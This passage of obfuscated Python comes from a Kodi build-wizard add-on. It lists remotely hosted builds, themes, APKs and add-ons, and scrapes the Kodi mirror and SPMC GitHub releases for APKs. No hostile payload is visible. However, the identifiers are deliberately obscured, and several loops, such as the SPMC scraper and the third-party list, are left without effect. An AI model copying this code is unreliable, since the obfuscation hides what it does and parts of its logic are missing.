		OOO0OO0000OO0O00O ,O000OOO0OO0OOOOO0 ,OO00O00O00O00OO00 ,O0OO000OO00000O0O ,O0OOOOO0OOO0OOOO0 ,OO00OOO00O0OO0O00 ,OOO0000O00OOO0O0O =wiz .buildCount ()#line:2220
		O0OO0000OO0O0OOO0 =False ;O00O0O0O000OOOO00 =[]#line:2221
		if THIRDPARTY =='true':#line:2222
			if not THIRD1NAME ==''and not THIRD1URL =='':O0OO0000OO0O0OOO0 =True ;O00O0O0O000OOOO00 .append ('1')#line:2223
			if not THIRD2NAME ==''and not THIRD2URL =='':O0OO0000OO0O0OOO0 =True ;O00O0O0O000OOOO00 .append ('2')#line:2224
			if not THIRD3NAME ==''and not THIRD3URL =='':O0OO0000OO0O0OOO0 =True ;O00O0O0O000OOOO00 .append ('3')#line:2225
		O0O000OOOO0O00OO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2226
		O0O00OOOO0OO0OO0O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O000OOOO0O00OO0 )#line:2227
		if OOO0OO0000OO0O00O ==1 and O0OO0000OO0O0OOO0 ==False :#line:2228
			for O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ,O000O0OOO000OOOO0 ,OO0O000OO0O00OO00 ,OO00O0O0OOOOOOOO0 ,OO0000O00O0O0OOOO ,O00O0O000000OOOOO ,OO000OOO0OO00O000 ,O0000OOO0O00OOO00 ,OO0O000OOO0000000 in O0O00OOOO0OO0OO0O :#line:2229
				if not SHOWADULT =='true'and O0000OOO0O00OOO00 .lower ()=='yes':continue #line:2230
				if not DEVELOPER =='true'and wiz .strTest (O000O00000O0OO0O0 ):continue #line:2231
				viewBuild (O0O00OOOO0OO0OO0O [0 ][0 ])#line:2232
				return #line:2233
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2236
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2237
		if O0OO0000OO0O0OOO0 ==True :#line:2238
			for OO0O00OOOO000O0O0 in O00O0O0O000OOOO00 :#line:2239
				O000O00000O0OO0O0 =eval ('THIRD%sNAME'%OO0O00OOOO000O0O0 )#line:2240
		if len (O0O00OOOO0OO0OO0O )>=1 :#line:2242
			if SEPERATE =='true':#line:2243
				for O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ,O000O0OOO000OOOO0 ,OO0O000OO0O00OO00 ,OO00O0O0OOOOOOOO0 ,OO0000O00O0O0OOOO ,O00O0O000000OOOOO ,OO000OOO0OO00O000 ,O0000OOO0O00OOO00 ,OO0O000OOO0000000 in O0O00OOOO0OO0OO0O :#line:2244
					if not SHOWADULT =='true'and O0000OOO0O00OOO00 .lower ()=='yes':continue #line:2245
					if not DEVELOPER =='true'and wiz .strTest (O000O00000O0OO0O0 ):continue #line:2246
					O0O000000O00O000O =createMenu ('install','',O000O00000O0OO0O0 )#line:2247
					addDir ('[%s] %s (v%s)'%(float (OO00O0O0OOOOOOOO0 ),O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ),'viewbuild',O000O00000O0OO0O0 ,description =OO0O000OOO0000000 ,fanart =OO000OOO0OO00O000 ,icon =O00O0O000000OOOOO ,menu =O0O000000O00O000O ,themeit =THEME2 )#line:2248
			else :#line:2249
				if O0OO000OO00000O0O >0 :#line:2250
					O00000OO0OO0OO0OO ='+'if SHOW17 =='false'else '-'#line:2251
					if SHOW17 =='true':#line:2253
						for O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ,O000O0OOO000OOOO0 ,OO0O000OO0O00OO00 ,OO00O0O0OOOOOOOO0 ,OO0000O00O0O0OOOO ,O00O0O000000OOOOO ,OO000OOO0OO00O000 ,O0000OOO0O00OOO00 ,OO0O000OOO0000000 in O0O00OOOO0OO0OO0O :#line:2255
							if not SHOWADULT =='true'and O0000OOO0O00OOO00 .lower ()=='yes':continue #line:2256
							if not DEVELOPER =='true'and wiz .strTest (O000O00000O0OO0O0 ):continue #line:2257
							OO000O0O000O000OO =int (float (OO00O0O0OOOOOOOO0 ))#line:2258
							if OO000O0O000O000OO ==17 :#line:2259
								O0O000000O00O000O =createMenu ('install','',O000O00000O0OO0O0 )#line:2260
								addDir ('[%s] %s (v%s)'%(float (OO00O0O0OOOOOOOO0 ),O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ),'viewbuild',O000O00000O0OO0O0 ,description =OO0O000OOO0000000 ,fanart =OO000OOO0OO00O000 ,icon =O00O0O000000OOOOO ,menu =O0O000000O00O000O ,themeit =THEME2 )#line:2261
				if O0OOOOO0OOO0OOOO0 >0 :#line:2262
					O00000OO0OO0OO0OO ='+'if SHOW18 =='false'else '-'#line:2263
					if SHOW18 =='true':#line:2265
						for O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ,O000O0OOO000OOOO0 ,OO0O000OO0O00OO00 ,OO00O0O0OOOOOOOO0 ,OO0000O00O0O0OOOO ,O00O0O000000OOOOO ,OO000OOO0OO00O000 ,O0000OOO0O00OOO00 ,OO0O000OOO0000000 in O0O00OOOO0OO0OO0O :#line:2267
							if not SHOWADULT =='true'and O0000OOO0O00OOO00 .lower ()=='yes':continue #line:2268
							if not DEVELOPER =='true'and wiz .strTest (O000O00000O0OO0O0 ):continue #line:2269
							OO000O0O000O000OO =int (float (OO00O0O0OOOOOOOO0 ))#line:2270
							if OO000O0O000O000OO ==18 :#line:2271
								O0O000000O00O000O =createMenu ('install','',O000O00000O0OO0O0 )#line:2272
								addDir ('[%s] %s (v%s)'%(float (OO00O0O0OOOOOOOO0 ),O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ),'viewbuild',O000O00000O0OO0O0 ,description =OO0O000OOO0000000 ,fanart =OO000OOO0OO00O000 ,icon =O00O0O000000OOOOO ,menu =O0O000000O00O000O ,themeit =THEME2 )#line:2273
				if OO00O00O00O00OO00 >0 :#line:2274
					O00000OO0OO0OO0OO ='+'if SHOW16 =='false'else '-'#line:2275
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O00000OO0OO0OO0OO ,OO00O00O00O00OO00 ),'togglesetting','show16',themeit =THEME3 )#line:2276
					if SHOW16 =='true':#line:2277
						for O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ,O000O0OOO000OOOO0 ,OO0O000OO0O00OO00 ,OO00O0O0OOOOOOOO0 ,OO0000O00O0O0OOOO ,O00O0O000000OOOOO ,OO000OOO0OO00O000 ,O0000OOO0O00OOO00 ,OO0O000OOO0000000 in O0O00OOOO0OO0OO0O :#line:2278
							if not SHOWADULT =='true'and O0000OOO0O00OOO00 .lower ()=='yes':continue #line:2279
							if not DEVELOPER =='true'and wiz .strTest (O000O00000O0OO0O0 ):continue #line:2280
							OO000O0O000O000OO =int (float (OO00O0O0OOOOOOOO0 ))#line:2281
							if OO000O0O000O000OO ==16 :#line:2282
								O0O000000O00O000O =createMenu ('install','',O000O00000O0OO0O0 )#line:2283
								addDir ('[%s] %s (v%s)'%(float (OO00O0O0OOOOOOOO0 ),O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ),'viewbuild',O000O00000O0OO0O0 ,description =OO0O000OOO0000000 ,fanart =OO000OOO0OO00O000 ,icon =O00O0O000000OOOOO ,menu =O0O000000O00O000O ,themeit =THEME2 )#line:2284
				if O000OOO0OO0OOOOO0 >0 :#line:2285
					O00000OO0OO0OO0OO ='+'if SHOW15 =='false'else '-'#line:2286
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O00000OO0OO0OO0OO ,O000OOO0OO0OOOOO0 ),'togglesetting','show15',themeit =THEME3 )#line:2287
					if SHOW15 =='true':#line:2288
						for O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ,O000O0OOO000OOOO0 ,OO0O000OO0O00OO00 ,OO00O0O0OOOOOOOO0 ,OO0000O00O0O0OOOO ,O00O0O000000OOOOO ,OO000OOO0OO00O000 ,O0000OOO0O00OOO00 ,OO0O000OOO0000000 in O0O00OOOO0OO0OO0O :#line:2289
							if not SHOWADULT =='true'and O0000OOO0O00OOO00 .lower ()=='yes':continue #line:2290
							if not DEVELOPER =='true'and wiz .strTest (O000O00000O0OO0O0 ):continue #line:2291
							OO000O0O000O000OO =int (float (OO00O0O0OOOOOOOO0 ))#line:2292
							if OO000O0O000O000OO <=15 :#line:2293
								O0O000000O00O000O =createMenu ('install','',O000O00000O0OO0O0 )#line:2294
								addDir ('[%s] %s (v%s)'%(float (OO00O0O0OOOOOOOO0 ),O000O00000O0OO0O0 ,O0OOOO0OO000OO0O0 ),'viewbuild',O000O00000O0OO0O0 ,description =OO0O000OOO0000000 ,fanart =OO000OOO0OO00O000 ,icon =O00O0O000000OOOOO ,menu =O0O000000O00O000O ,themeit =THEME2 )#line:2295
		elif OOO0000O00OOO0O0O >0 :#line:2296
			if OO00OOO00O0OO0O00 >0 :#line:2297
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2298
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2299
			else :#line:2300
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2301
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2302
	setView ('files','viewType')#line:2303
def viewBuild (O0O00000000O000O0 ):#line:2305
	O0O00000OOO000OO0 =wiz .workingURL (SPEEDFILE )#line:2306
	if not O0O00000OOO000OO0 ==True :#line:2307
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2308
		addFile ('%s'%O0O00000OOO000OO0 ,'',themeit =THEME3 )#line:2309
		return #line:2310
	if wiz .checkBuild (O0O00000000O000O0 ,'version')==False :#line:2311
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2312
		addFile ('%s was not found in the builds list.'%O0O00000000O000O0 ,'',themeit =THEME3 )#line:2313
		return #line:2314
	O0000OOO00OO00O0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2315
	OO000O0000O0OOOOO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O00000000O000O0 ).findall (O0000OOO00OO00O0O )#line:2316
	for O0O000OO0O0OOOO00 ,O00OOOO0OOOO0OOOO ,O0O00OOOO0O000OO0 ,OO0OO000OO0OO0O0O ,OO0O00O0OOO00OOO0 ,O00O00OO00O0O0000 ,O0OOO0OO0O000O0OO ,OO00OOO0O00OO0000 ,OO00O0OO0OO00OOO0 ,O0OO0OOOOO0O00OOO in OO000O0000O0OOOOO :#line:2317
		O00O00OO00O0O0000 =O00O00OO00O0O0000 if wiz .workingURL (O00O00OO00O0O0000 )else ICON #line:2318
		O0OOO0OO0O000O0OO =O0OOO0OO0O000O0OO if wiz .workingURL (O0OOO0OO0O000O0OO )else FANART #line:2319
		O00OO00OO0000000O ='%s (v%s)'%(O0O00000000O000O0 ,O0O000OO0O0OOOO00 )#line:2320
		if BUILDNAME ==O0O00000000O000O0 and O0O000OO0O0OOOO00 >BUILDVERSION :#line:2321
			O00OO00OO0000000O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O00OO00OO0000000O ,BUILDVERSION )#line:2322
		OOO0O0O0000OO0OO0 =int (float (KODIV ));OO0O0O0O000000O00 =int (float (OO0OO000OO0OO0O0O ))#line:2331
		if not OOO0O0O0000OO0OO0 ==OO0O0O0O000000O00 :#line:2332
			if OOO0O0O0000OO0OO0 ==16 and OO0O0O0O000000O00 <=15 :OO0O0OO0O00000000 =False #line:2333
			else :OO0O0OO0O00000000 =True #line:2334
		else :OO0O0OO0O00000000 =False #line:2335
		addFile ('התקנה','install',O0O00000000O000O0 ,'fresh',description =O0OO0OOOOO0O00OOO ,fanart =O0OOO0OO0O000O0OO ,icon =O00O00OO00O0O0000 ,themeit =THEME1 )#line:2339
		if not OO0O00O0OOO00OOO0 =='http://':#line:2342
			if wiz .workingURL (OO0O00O0OOO00OOO0 )==True :#line:2343
				addFile (wiz .sep ('THEMES'),'',fanart =O0OOO0OO0O000O0OO ,icon =O00O00OO00O0O0000 ,themeit =THEME3 )#line:2344
				O0000OOO00OO00O0O =wiz .openURL (OO0O00O0OOO00OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2345
				OO000O0000O0OOOOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000OOO00OO00O0O )#line:2346
				for O00OOO0O000O0OOO0 ,OO00OOOO0OOOOOO0O ,OO0OO00OOOOO0O0O0 ,OO0O0O000000O00OO ,O0O0O0O00OOO0O0O0 ,O0OO0OOOOO0O00OOO in OO000O0000O0OOOOO :#line:2347
					if not SHOWADULT =='true'and O0O0O0O00OOO0O0O0 .lower ()=='yes':continue #line:2348
					OO0OO00OOOOO0O0O0 =OO0OO00OOOOO0O0O0 if OO0OO00OOOOO0O0O0 =='http://'else O00O00OO00O0O0000 #line:2349
					OO0O0O000000O00OO =OO0O0O000000O00OO if OO0O0O000000O00OO =='http://'else O0OOO0OO0O000O0OO #line:2350
					addFile (O00OOO0O000O0OOO0 if not O00OOO0O000O0OOO0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O00OOO0O000O0OOO0 ,'theme',O0O00000000O000O0 ,O00OOO0O000O0OOO0 ,description =O0OO0OOOOO0O00OOO ,fanart =OO0O0O000000O00OO ,icon =OO0OO00OOOOO0O0O0 ,themeit =THEME3 )#line:2351
	setView ('files','viewType')#line:2352
def viewThirdList (OO0000O0O000O00O0 ):#line:2354
	O0OOO00OOOOOOO0OO =eval ('THIRD%sNAME'%OO0000O0O000O00O0 )#line:2355
	O00OO0O0OOO000OO0 =eval ('THIRD%sURL'%OO0000O0O000O00O0 )#line:2356
	OO0OO0O000O0OOO00 =wiz .workingURL (O00OO0O0OOO000OO0 )#line:2357
	if not OO0OO0O000O0OOO00 ==True :#line:2358
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2359
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2360
	else :#line:2361
		OO0OO0OO0O00O00O0 ,OO0000OOOOOOO0OOO =wiz .thirdParty (O00OO0O0OOO000OO0 )#line:2362
		addFile ("[B]%s[/B]"%O0OOO00OOOOOOO0OO ,'',themeit =THEME3 )#line:2363
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2364
		if OO0OO0OO0O00O00O0 :#line:2365
			for O0OOO00OOOOOOO0OO ,OOO0O00000O00OOOO ,O00OO0O0OOO000OO0 ,O0O00OO00O0O0O000 ,O0O0O00O0O0OOOOO0 ,OO0OOO0O00O00O00O ,OO00O00OOOO000OOO ,OO0O00OOOO0O0OO0O in OO0000OOOOOOO0OOO :#line:2366
				if not SHOWADULT =='true'and OO00O00OOOO000OOO .lower ()=='yes':continue #line:2367
				addFile ("[%s] %s v%s"%(O0O00OO00O0O0O000 ,O0OOO00OOOOOOO0OO ,OOO0O00000O00OOOO ),'installthird',O0OOO00OOOOOOO0OO ,O00OO0O0OOO000OO0 ,icon =O0O0O00O0O0OOOOO0 ,fanart =OO0OOO0O00O00O00O ,description =OO0O00OOOO0O0OO0O ,themeit =THEME2 )#line:2368
		else :#line:2369
			for O0OOO00OOOOOOO0OO ,O00OO0O0OOO000OO0 ,O0O0O00O0O0OOOOO0 ,OO0OOO0O00O00O00O ,OO0O00OOOO0O0OO0O in OO0000OOOOOOO0OOO :#line:2370
				addFile (O0OOO00OOOOOOO0OO ,'installthird',O0OOO00OOOOOOO0OO ,O00OO0O0OOO000OO0 ,icon =O0O0O00O0O0OOOOO0 ,fanart =OO0OOO0O00O00O00O ,description =OO0O00OOOO0O0OO0O ,themeit =THEME2 )#line:2371
def editThirdParty (O000OOO000O000OOO ):#line:2373
	OOO0000O0O00O000O =eval ('THIRD%sNAME'%O000OOO000O000OOO )#line:2374
	OOOO0O0OO00OOOOOO =eval ('THIRD%sURL'%O000OOO000O000OOO )#line:2375
	OOO00O0O0OO0OOOO0 =wiz .getKeyboard (OOO0000O0O00O000O ,'Enter the Name of the Wizard')#line:2376
	O0OOOOOO00OOOO00O =wiz .getKeyboard (OOOO0O0OO00OOOOOO ,'Enter the URL of the Wizard Text')#line:2377
	wiz .setS ('wizard%sname'%O000OOO000O000OOO ,OOO00O0O0OO0OOOO0 )#line:2379
	wiz .setS ('wizard%surl'%O000OOO000O000OOO ,O0OOOOOO00OOOO00O )#line:2380
def apkScraper (name =""):#line:2382
	if name =='kodi':#line:2383
		OOOO000O00OO0OO00 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2384
		OOOOO00O00OO0O00O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2385
		OOO000O0OOOOO0000 =wiz .openURL (OOOO000O00OO0OO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2386
		OO000OO0O00O0O0O0 =wiz .openURL (OOOOO00O00OO0O00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2387
		OOO0OOOOO0OO0000O =0 #line:2388
		OO000O0O00000000O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO000O0OOOOO0000 )#line:2389
		O00O0OOOOO0O0O000 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO000OO0O00O0O0O0 )#line:2390
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2392
		O000OOO0O000OO0OO =False #line:2393
		for OO0OO00O0O0OOOO00 ,name ,OO0OO0O000OOO0OO0 ,OO0O000OO00O0O000 in OO000O0O00000000O :#line:2394
			if OO0OO00O0O0OOOO00 in ['../','old/']:continue #line:2395
			if not OO0OO00O0O0OOOO00 .endswith ('.apk'):continue #line:2396
			if not OO0OO00O0O0OOOO00 .find ('_')==-1 and O000OOO0O000OO0OO ==True :continue #line:2397
			try :#line:2398
				O0O00000OO00O00OO =name .split ('-')#line:2399
				if not OO0OO00O0O0OOOO00 .find ('_')==-1 :#line:2400
					O000OOO0O000OO0OO =True #line:2401
					OOO00O000O0O0O0O0 ,OOOO000OOO00000OO =O0O00000OO00O00OO [2 ].split ('_')#line:2402
				else :#line:2403
					OOO00O000O0O0O0O0 =O0O00000OO00O00OO [2 ]#line:2404
					OOOO000OOO00000OO =''#line:2405
				O0OO000O0OOO00OO0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00000OO00O00OO [0 ].title (),O0O00000OO00O00OO [1 ],OOOO000OOO00000OO .upper (),OOO00O000O0O0O0O0 ,COLOR2 ,OO0OO0O000OOO0OO0 .replace (' ',''),COLOR1 ,OO0O000OO00O0O000 )#line:2406
				OO0O0OOOOO000O000 =urljoin (OOOO000O00OO0OO00 ,OO0OO00O0O0OOOO00 )#line:2407
				addFile (O0OO000O0OOO00OO0 ,'apkinstall',"%s v%s%s %s"%(O0O00000OO00O00OO [0 ].title (),O0O00000OO00O00OO [1 ],OOOO000OOO00000OO .upper (),OOO00O000O0O0O0O0 ),OO0O0OOOOO000O000 )#line:2408
				OOO0OOOOO0OO0000O +=1 #line:2409
			except :#line:2410
				wiz .log ("Error on: %s"%name )#line:2411
		for OO0OO00O0O0OOOO00 ,name ,OO0OO0O000OOO0OO0 ,OO0O000OO00O0O000 in O00O0OOOOO0O0O000 :#line:2413
			if OO0OO00O0O0OOOO00 in ['../','old/']:continue #line:2414
			if not OO0OO00O0O0OOOO00 .endswith ('.apk'):continue #line:2415
			if not OO0OO00O0O0OOOO00 .find ('_')==-1 :continue #line:2416
			try :#line:2417
				O0O00000OO00O00OO =name .split ('-')#line:2418
				O0OO000O0OOO00OO0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00000OO00O00OO [0 ].title (),O0O00000OO00O00OO [1 ],O0O00000OO00O00OO [2 ],COLOR2 ,OO0OO0O000OOO0OO0 .replace (' ',''),COLOR1 ,OO0O000OO00O0O000 )#line:2419
				OO0O0OOOOO000O000 =urljoin (OOOOO00O00OO0O00O ,OO0OO00O0O0OOOO00 )#line:2420
				addFile (O0OO000O0OOO00OO0 ,'apkinstall',"%s v%s %s"%(O0O00000OO00O00OO [0 ].title (),O0O00000OO00O00OO [1 ],O0O00000OO00O00OO [2 ]),OO0O0OOOOO000O000 )#line:2421
				OOO0OOOOO0OO0000O +=1 #line:2422
			except :#line:2423
				wiz .log ("Error on: %s"%name )#line:2424
		if OOO0OOOOO0OO0000O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2425
	elif name =='spmc':#line:2426
		O0000000OO0OOO0OO ='https://github.com/koying/SPMC/releases'#line:2427
		OOO000O0OOOOO0000 =wiz .openURL (O0000000OO0OOO0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2428
		OOO0OOOOO0OO0000O =0 #line:2429
		OO000O0O00000000O =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOO000O0OOOOO0000 )#line:2430
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2432
		for name ,OOOO0OO0O0OOOOO0O in OO000O0O00000000O :#line:2434
			OOOOO00000O0O00OO =''#line:2435
			O00O0OOOOO0O0O000 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOOO0OO0O0OOOOO0O )#line:2436
			for O0OOOO0OOO0OOOO0O ,OOOOOOOO00O00000O ,OO0OOOOO00OOO00O0 in O00O0OOOOO0O0O000 :#line:2437
				if OO0OOOOO00OOO00O0 .find ('armeabi')==-1 :continue #line:2438
				if OO0OOOOO00OOO00O0 .find ('launcher')>-1 :continue #line:2439
				OOOOO00000O0O00OO =urljoin ('https://github.com',O0OOOO0OOO0OOOO0O )#line:2440
				break #line:2441
		if OOO0OOOOO0OO0000O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2443
def apkMenu (url =None ):#line:2445
	if url ==None :#line:2446
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2449
	if not APKFILE =='http://':#line:2450
		if url ==None :#line:2451
			OO00O00O0OOO000OO =wiz .workingURL (APKFILE )#line:2452
			O0O0O00OO0O0OO0OO =uservar .APKFILE #line:2453
		else :#line:2454
			OO00O00O0OOO000OO =wiz .workingURL (url )#line:2455
			O0O0O00OO0O0OO0OO =url #line:2456
		if OO00O00O0OOO000OO ==True :#line:2457
			OO0O0O00OO00OO000 =wiz .openURL (O0O0O00OO0O0OO0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2458
			O0000OOO0OO0OOOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O0O00OO00OO000 )#line:2459
			if len (O0000OOO0OO0OOOO0 )>0 :#line:2460
				O0O000OO0O0OOOOO0 =0 #line:2461
				for OO0O000OOOO000O00 ,O00OOOO0O0000O000 ,url ,O00O0O0O00O0000O0 ,O0OOOOOOO00000OO0 ,O0O00OO0O00O00O00 ,OO0O0O0OOOO00OO0O in O0000OOO0OO0OOOO0 :#line:2462
					if not SHOWADULT =='true'and O0O00OO0O00O00O00 .lower ()=='yes':continue #line:2463
					if O00OOOO0O0000O000 .lower ()=='yes':#line:2464
						O0O000OO0O0OOOOO0 +=1 #line:2465
						addDir ("[B]%s[/B]"%OO0O000OOOO000O00 ,'apk',url ,description =OO0O0O0OOOO00OO0O ,icon =O00O0O0O00O0000O0 ,fanart =O0OOOOOOO00000OO0 ,themeit =THEME3 )#line:2466
					else :#line:2467
						O0O000OO0O0OOOOO0 +=1 #line:2468
						addFile (OO0O000OOOO000O00 ,'apkinstall',OO0O000OOOO000O00 ,url ,description =OO0O0O0OOOO00OO0O ,icon =O00O0O0O00O0000O0 ,fanart =O0OOOOOOO00000OO0 ,themeit =THEME2 )#line:2469
					if O0O000OO0O0OOOOO0 <1 :#line:2470
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2471
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2472
		else :#line:2473
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2474
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2475
			addFile ('%s'%OO00O00O0OOO000OO ,'',themeit =THEME3 )#line:2476
		return #line:2477
	else :wiz .log ("[APK Menu] No APK list added.")#line:2478
	setView ('files','viewType')#line:2479
def addonMenu (url =None ):#line:2481
	if not ADDONFILE =='http://':#line:2482
		if url ==None :#line:2483
			OOOOO0OO0OO00O0O0 =wiz .workingURL (ADDONFILE )#line:2484
			O0O0O0O0O000O00OO =uservar .ADDONFILE #line:2485
		else :#line:2486
			OOOOO0OO0OO00O0O0 =wiz .workingURL (url )#line:2487
			O0O0O0O0O000O00OO =url #line:2488
		if OOOOO0OO0OO00O0O0 ==True :#line:2489
			OOO0OOO0O0O0O000O =wiz .openURL (O0O0O0O0O000O00OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2490
			O0OOO0000000O0000 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0OOO0O0O0O000O )#line:2491
			if len (O0OOO0000000O0000 )>0 :#line:2492
				O0O000000OOOOOOO0 =0 #line:2493
				for OO00OO00O0OOO000O ,OO0O00O00OO0OO000 ,url ,O0OO00O00OOO000OO ,O0OOOO0OOO000OOO0 ,O00OOOO000OOO00OO ,O00OO0O0O0OOO00O0 ,OOOO0OO0000000OOO ,OOOO0O000O000OO0O ,OOOO000OO0OO000OO in O0OOO0000000O0000 :#line:2494
					if OO0O00O00OO0OO000 .lower ()=='section':#line:2495
						O0O000000OOOOOOO0 +=1 #line:2496
						addDir ("[B]%s[/B]"%OO00OO00O0OOO000O ,'addons',url ,description =OOOO000OO0OO000OO ,icon =O00OO0O0O0OOO00O0 ,fanart =OOOO0OO0000000OOO ,themeit =THEME3 )#line:2497
					else :#line:2498
						if not SHOWADULT =='true'and OOOO0O000O000OO0O .lower ()=='yes':continue #line:2499
						try :#line:2500
							O000O00OOOOO00O00 =xbmcaddon .Addon (id =OO0O00O00OO0OO000 ).getAddonInfo ('path')#line:2501
							if os .path .exists (O000O00OOOOO00O00 ):#line:2502
								OO00OO00O0OOO000O ="[COLOR green][Installed][/COLOR] %s"%OO00OO00O0OOO000O #line:2503
						except :#line:2504
							pass #line:2505
						O0O000000OOOOOOO0 +=1 #line:2506
						addFile (OO00OO00O0OOO000O ,'addoninstall',OO0O00O00OO0OO000 ,O0O0O0O0O000O00OO ,description =OOOO000OO0OO000OO ,icon =O00OO0O0O0OOO00O0 ,fanart =OOOO0OO0000000OOO ,themeit =THEME2 )#line:2507
					if O0O000000OOOOOOO0 <1 :#line:2508
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2509
			else :#line:2510
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2511
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2512
		else :#line:2513
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2514
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2515
			addFile ('%s'%OOOOO0OO0OO00O0O0 ,'',themeit =THEME3 )#line:2516
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2517
	setView ('files','viewType')#line:2518
def addonInstaller (O00O00OO0OO0O0OO0 ,O0000O0000OO0OOO0 ):#line:2520
	if not ADDONFILE =='http://':#line:2521
		O000O00OO00O0000O =wiz .workingURL (O0000O0000OO0OOO0 )#line:2522
		if O000O00OO00O0000O ==True :#line:2523
			OO00000O0O000OOOO =wiz .openURL (O0000O0000OO0OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2524
			O0O0OOOO00O00O000 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00O00OO0OO0O0OO0 ).findall (OO00000O0O000OOOO )#line:2525
			if len (O0O0OOOO00O00O000 )>0 :#line:2526
